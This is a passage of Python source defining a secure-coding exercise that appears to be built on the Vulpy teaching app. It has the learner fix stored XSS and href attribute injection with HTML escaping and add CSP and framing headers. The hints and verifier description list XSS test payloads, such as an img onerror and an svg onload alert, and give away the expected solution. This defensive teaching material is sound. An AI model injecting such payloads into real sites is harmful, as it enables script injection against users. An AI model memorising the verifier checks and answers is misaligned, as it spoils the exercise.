                "HttpOnly fix, that also stole sessions). Usernames are injected into both element text and an "
                "`href` attribute. `security_headers()` returns nothing because `csp.txt` was never deployed.\n\n"
                "**Steps**\n"
                "1. `import html` and wrap every user-controlled value with `html.escape(value, quote=True)` - post "
                "text, the heading username, and both the href and text of `render_user_link`.\n"
                "2. Escape, don't strip: `Fish & Chips` must render as `Fish &amp; Chips`, and `<script>` as "
                "`&lt;script&gt;`.\n"
                "3. Implement `security_headers()` returning at least:\n"
                "   - `Content-Security-Policy`: `default-src 'self'; script-src 'self'; object-src 'none'; "
                "frame-ancestors 'none'` (no `'unsafe-inline'` / `'unsafe-eval'`)\n"
                "   - `X-Content-Type-Options: nosniff`\n"
                "   - `X-Frame-Options: DENY`\n"
                "4. Update FINDINGS.md: why output encoding is the fix and CSP is only a second layer."
            ),
            validation_criteria=[
                "Post bodies are HTML-escaped (`<script>` -> `&lt;script&gt;`, `&` -> `&amp;`)",
                "Usernames are escaped in heading text and inside the href attribute (quotes included)",
                "`security_headers()` returns a strict CSP (no unsafe-inline/eval), nosniff and anti-framing",
            ],
            hints=[
                "When the browser receives `<li>` + post text + `</li>`, how does it know which `<` came from you and which came from an attacker?",
                "Python ships `html.escape(s, quote=True)`, which converts `& < > \" '`. Apply it at the point of output, to every interpolated value.",
                "`f'<li><a href=\"/posts/{html.escape(user, quote=True)}\">{html.escape(user)}</a></li>'` and return a dict with `Content-Security-Policy`, `X-Content-Type-Options` and `X-Frame-Options` from `security_headers()`.",
            ],
            target_file="posts_view.py",
            mentor_context=(
                "CWE-79 Stored XSS, CWE-83 attribute injection, CWE-693 Protection Mechanism Failure, CWE-1021 "
                "clickjacking; OWASP A03:2021 Injection; ASVS 5.3.3 (context-aware output encoding), 14.4.3 (CSP), "
                "14.4.4 (nosniff), 14.4.7 (frame-ancestors). Vulpy BAD and GOOD both keep `| safe` in posts.view.html "
                "(the GOOD version relies on a CSP from csp.txt as mitigation) - the correct primary fix is removing "
                "`| safe` / escaping, with CSP as defense-in-depth; be explicit that CSP alone is not a fix. In real "
                "Flask, Jinja autoescape does this automatically for .html templates unless `| safe` or Markup() is "
                "used. Verifier behaviour: render_posts('elliot', [script payload, '<img src=x onerror=alert(1)>', "
                "'Fish & Chips']) must contain no '<script'/'<img' (case-insensitive), must contain '&lt;script&gt;' "
                "and 'Fish &amp; Chips' (so stripping/bleach-style removal fails); render_posts('\"><svg "
                "onload=alert(1)>', []) must not contain '<svg'; render_user_link('x\" onmouseover=\"alert(1)') must "
                "not contain 'x\" onmouseover' and must still contain '<a'; security_headers() keys case-insensitive: "
                "CSP containing \"default-src 'self'\" or \"script-src 'self'\" with no unsafe-inline/unsafe-eval, "
                "X-Content-Type-Options == nosniff, and X-Frame-Options DENY/SAMEORIGIN or CSP frame-ancestors. "
                "Pitfall: double-escaping is harmless for tests but wrong in prod; escaping only the post text but not "
                "the username; using quote=False inside attributes."
            ),
        ),
    ],
)

